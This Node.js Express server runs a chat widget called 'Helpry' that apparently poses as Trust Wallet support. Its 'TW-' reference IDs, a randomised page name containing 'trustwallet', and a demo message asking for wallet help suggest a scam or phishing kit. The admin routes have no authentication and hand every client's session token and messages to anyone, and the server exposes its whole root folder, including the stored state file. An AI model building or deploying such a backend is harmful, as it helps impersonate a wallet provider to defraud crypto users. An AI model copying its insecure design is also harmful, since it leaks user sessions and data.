const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 5500;
const ROOT = __dirname;
const DATA_DIR = path.join(ROOT, 'data');
const STATE_FILE = path.join(DATA_DIR, 'state.json');

const upload = multer({ storage: multer.memoryStorage() });

function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
}

function defaultState() {
  return {
    nextClientId: 1,
    nextMessageId: 1,
    clients: []
  };
}

function loadState() {
  ensureDataDir();

  try {
    if (!fs.existsSync(STATE_FILE)) {
      fs.writeFileSync(STATE_FILE, JSON.stringify(defaultState(), null, 2));
      return defaultState();
    }

    const raw = fs.readFileSync(STATE_FILE, 'utf8');
    if (!raw.trim()) {
      fs.writeFileSync(STATE_FILE, JSON.stringify(defaultState(), null, 2));
      return defaultState();
    }

    const parsed = JSON.parse(raw);
    return {
      nextClientId: Number(parsed.nextClientId || 1),
      nextMessageId: Number(parsed.nextMessageId || 1),
      clients: Array.isArray(parsed.clients) ? parsed.clients : []
    };
  } catch (error) {
    console.error('Failed to load state, resetting storage:', error.message);
    const fresh = defaultState();
    fs.writeFileSync(STATE_FILE, JSON.stringify(fresh, null, 2));
    return fresh;
  }
}

let state = loadState();

function saveState() {
  ensureDataDir();
  fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2));
}

function makeCacheLock() {
  return crypto.randomBytes(24).toString('hex');
}

function getClientByCacheLock(cacheLock) {
  return state.clients.find(client => client.cache_lock === cacheLock) || null;
}

function getClientById(clientId) {
  const id = Number(clientId);
  return state.clients.find(client => client.id === id) || null;
}

function sanitizeMessage(msg) {
  return {
    id: msg.id,
    sender_type: msg.sender_type,
    message: msg.message || '',
    image_urls: Array.isArray(msg.image_urls) ? msg.image_urls : [],
    created_at: msg.created_at || new Date().toISOString()
  };
}

function listClientMessages(client) {
  const list = Array.isArray(client.messages) ? client.messages : [];
  return list.slice().sort((a, b) => new Date(a.created_at) - new Date(b.created_at)).map(sanitizeMessage);
}

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(ROOT));

app.get('/health', (req, res) => {
  res.json({ ok: true, status: 'running', port: PORT });
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(ROOT, 'admin.html'));
});

app.get('/api/admin/clients', (req, res) => {
  res.json({
    success: true,
    clients: state.clients.map(client => ({
      id: client.id,
      ref_id: client.ref_id,
      helpry_id: client.helpry_id,
      country: client.country,
      cache_lock: client.cache_lock,
      created_at: client.created_at,
      messages: listClientMessages(client)
    }))
  });
});

app.post('/api/register-client', (req, res) => {
  const { helpry_id, country } = req.body || {};

  if (!helpry_id) {
    return res.status(400).json({ success: false, error: 'Missing helpry_id' });
  }

  const client = {
    id: state.nextClientId++,
    ref_id: `TW-${String(state.nextClientId - 1).padStart(5, '0')}`,
    helpry_id: Number(helpry_id),
    country: country || 'Unknown',
    cache_lock: makeCacheLock(),
    created_at: new Date().toISOString(),
    messages: []
  };

  state.clients.push(client);
  saveState();

  res.json({
    success: true,
    client: {
      id: client.id,
      ref_id: client.ref_id,
      helpry_id: client.helpry_id,
      country: client.country,
      cache_lock: client.cache_lock
    }
  });
});

app.post('/api/verify-cache-lock', (req, res) => {
  const { cache_lock } = req.body || {};

  if (!cache_lock) {
    return res.status(400).json({ valid: false, reason: 'Missing cache_lock' });
  }

  const client = getClientByCacheLock(cache_lock);
  if (!client) {
    return res.json({ valid: false, reason: 'invalid cache lock' });
  }

  return res.json({
    valid: true,
    client: {
      id: client.id,
      ref_id: client.ref_id,
      helpry_id: client.helpry_id,
      country: client.country,
      cache_lock: client.cache_lock
    }
  });
});

app.post('/api/messages/fetch', (req, res) => {
  const { cache_lock } = req.body || {};

  if (!cache_lock) {
    return res.status(400).json({ success: false, error: 'Missing cache_lock' });
  }

  const client = getClientByCacheLock(cache_lock);
  if (!client) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  return res.json({
    success: true,
    messages: listClientMessages(client)
  });
});

app.post('/api/messages/send', upload.array('images[]', 3), (req, res) => {
  const { cache_lock, message } = req.body || {};

  if (!cache_lock) {
    return res.status(400).json({ success: false, error: 'Missing cache_lock' });
  }

  const client = getClientByCacheLock(cache_lock);
  if (!client) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  const msgText = (message || '').trim();
  if (!msgText && (!req.files || req.files.length === 0)) {
    return res.status(400).json({ success: false, error: 'Empty message' });
  }

  const newMessage = {
    id: state.nextMessageId++,
    sender_type: 'client',
    message: msgText,
    image_urls: [],
    created_at: new Date().toISOString()
  };

  client.messages.push(newMessage);
  saveState();

  return res.json({
    success: true,
    message: sanitizeMessage(newMessage)
  });
});

app.post('/api/admin/reply', (req, res) => {
  const { client_id, message } = req.body || {};

  if (!client_id) {
    return res.status(400).json({ success: false, error: 'Missing client_id' });
  }

  const client = getClientById(client_id);
  if (!client) {
    return res.status(404).json({ success: false, error: 'Client not found' });
  }

  const msgText = (message || '').trim();
  if (!msgText) {
    return res.status(400).json({ success: false, error: 'Message is empty' });
  }

  const reply = {
    id: state.nextMessageId++,
    sender_type: 'admin',
    message: msgText,
    image_urls: [],
    created_at: new Date().toISOString()
  };

  client.messages.push(reply);
  saveState();

  return res.json({
    success: true,
    message: sanitizeMessage(reply)
  });
});

app.get('/api/admin/seed-demo', (req, res) => {
  if (state.clients.length > 0) {
    return res.json({ success: true, message: 'Demo already created', clients: state.clients.length });
  }

  const demoClient = {
    id: state.nextClientId++,
    ref_id: 'TW-00001',
    helpry_id: 8484,
    country: 'United States',
    cache_lock: 'demo-cache-lock-helpry-0001',
    created_at: new Date().toISOString(),
    messages: [
      {
        id: state.nextMessageId++,
        sender_type: 'client',
        message: 'Hi, I need help with my wallet.',
        image_urls: [],
        created_at: new Date().toISOString()
      }
    ]
  };

  state.clients.push(demoClient);
  saveState();

  return res.json({ success: true, client: demoClient });
});

app.use((req, res) => {
  if (req.method !== 'GET') {
    return res.status(405).json({ success: false, error: 'Method not allowed for this endpoint.' });
  }

  const fallback = path.join(ROOT, req.path.replace(/^\//, ''));
  if (fs.existsSync(fallback) && fs.statSync(fallback).isFile()) {
    return res.sendFile(fallback);
  }

  return res.status(404).json({ success: false, error: 'Not found' });
});

app.listen(PORT, () => {
  console.log(`Helpry local chat server is running on http://127.0.0.1:${PORT}`);
  console.log('Open http://127.0.0.1:5500/helpry.jp/cmupnn-trustwallet-xostfj-helpry-eohlok-trustwallet-gkqtyx.html to test the widget');
  console.log('Open http://127.0.0.1:5500/admin to manage chats');
});
